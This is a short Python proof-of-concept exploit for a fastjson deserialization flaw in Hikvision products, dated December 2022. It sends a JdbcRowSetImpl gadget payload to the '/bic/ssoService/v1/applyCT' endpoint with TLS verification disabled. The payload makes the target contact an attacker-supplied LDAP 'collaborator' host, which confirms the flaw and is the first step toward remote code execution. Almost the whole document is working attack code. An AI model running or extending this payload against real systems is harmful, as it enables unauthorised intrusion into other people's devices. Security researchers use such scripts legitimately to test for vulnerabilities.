# Hikvision fastjson PoC
# - Nicolas 21/12/2022


import urllib3
import requests,sys
requests.packages.urllib3.disable_warnings()

def hikvision(url,collabaddr):
    url = url.strip()
    url = url + '/bic/ssoService/v1/applyCT'
    t_headers = {"Content-Type": "application/json;charset=UTF-8", "Accept-Language": "en", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.37"}
    c_data = '{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://'+ collabaddr+'","autoCommit":true}}'
    try:
        r = requests.post(url,headers=t_headers,data=c_data, timeout=50,verify=False)
        print ("Connecting to:", url)
        if (r.status_code == 404):
            print ("Not vulnerable")
        else:
            print ("Check collaborator")
    except requests.exceptions.RequestException as e:
        raise SystemExit(e)


if __name__ == '__main__':
    try:
        hikvision(sys.argv[1], sys.argv[2])
    except:
        print ("python hik.py targetURL collaborator")
